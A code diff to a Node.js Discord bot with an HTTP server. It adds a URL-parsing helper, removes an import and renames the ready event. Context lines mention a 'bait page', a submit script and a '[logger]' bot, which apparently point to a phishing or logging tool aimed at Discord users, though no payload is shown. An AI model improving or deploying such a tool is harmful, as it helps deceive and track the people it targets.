@@ -7,7 +7,6 @@ import {
 import { createServer } from "http";
 import { readFile, writeFile, access } from "fs/promises";
 import { constants } from "fs";
-import { URL } from "url";
 
 const TOKEN      = process.env.BOT_TOKEN    ?? "FILL: bot token";
 const PORT       = 25689;
@@ -97,6 +96,16 @@ function readBody(req) {
   });
 }
 
+// ── safe url parse ────────────────────────────────────────────────────────────
+function parseURL(raw) {
+  try {
+    const cleaned = raw.replace(/^\/\/+/, "/");
+    return new URL(cleaned, "http://localhost");
+  } catch {
+    return new URL("/", "http://localhost");
+  }
+}
+
 // ── bait page ─────────────────────────────────────────────────────────────────
 function baitPage(uid, to) {
   return `<!DOCTYPE html>
@@ -165,7 +174,7 @@ function submit(){
 
 // ── http server ───────────────────────────────────────────────────────────────
 createServer(async (req, res) => {
-  const u = new URL(req.url, `http://localhost`);
+  const u = parseURL(req.url ?? "/");
 
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
@@ -218,7 +227,7 @@ const client = new Client({
   ],
 });
 
-client.once("ready", () => console.log(`[logger] online as ${client.user.tag}`));
+client.once("clientReady", () => console.log(`[logger] online as ${client.user.tag}`));
 
 client.on("messageCreate", async (msg) => {
   if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
